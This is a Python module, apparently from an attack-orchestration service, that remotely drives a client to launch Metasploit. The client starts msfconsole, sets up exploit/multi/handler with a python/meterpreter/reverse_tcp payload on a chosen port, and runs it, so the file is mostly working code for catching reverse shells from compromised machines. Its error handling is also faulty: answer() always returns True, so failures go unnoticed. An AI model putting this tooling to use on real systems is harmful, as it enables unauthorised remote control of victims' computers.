import select
import uuid

def find_socket(ip: str):
    from Service.exploit_socket import client_sockets
    if client_sockets.get(ip):
        return True
    return False

def exploit_start(ip: str, port:int, client_ip: str, payload: str):
    from Service.exploit_socket import client_sockets
    socket = client_sockets.get(ip)
    
    socket.sendall(b"Port:" + str(port).encode() + b"\n")
    if not answer(socket):
        print("Error while sending the port.")
        return False
    socket.sendall(b"Screen:metasploit_" + ip.encode() + b"_" + str(uuid.uuid4()).encode()+b"\n")
    if not answer(socket):
        print("Error while sending the exploit command.")
        return False
    socket.sendall(b"Command:msfconsole")
    if not answer(socket):
        print("Error while sending the msfconsole command.")
        return False
    socket.sendall(b"openpty")
    socket.sendall(b"Command:use exploit/multi/handler")
    if not answer(socket):
        print("Error while sending the use command.")
        return False
    socket.sendall(b"Command:set payload python/meterpreter/reverse_tcp")
    if not answer(socket):
        print("Error while sending the set payload command.")
        return False
    socket.sendall(b"Command:set LHOST 0.0.0.0")
    if not answer(socket):
        print("Error while sending the set LHOST command.")
        return False
    socket.sendall(b"Command:set LPORT " + str(port).encode())
    if not answer(socket):
        print("Error while sending the set LPORT command.")
        return False
    socket.sendall(b"Command:exploit")
    if not answer(socket):
        print("Error while sending the exploit command.")
        return False
    socket.sendall(b"EXPLOIT")
    return True

def answer(socket):
    while True:
        ready_to_read, _, _ = select.select([socket], [], [], 1.0)
        if ready_to_read:
            data = socket.recv(1024)
            if not data:
                break
            print(f"Client: {data.decode()}")
            if "OK" in data.decode():
                break
    return True

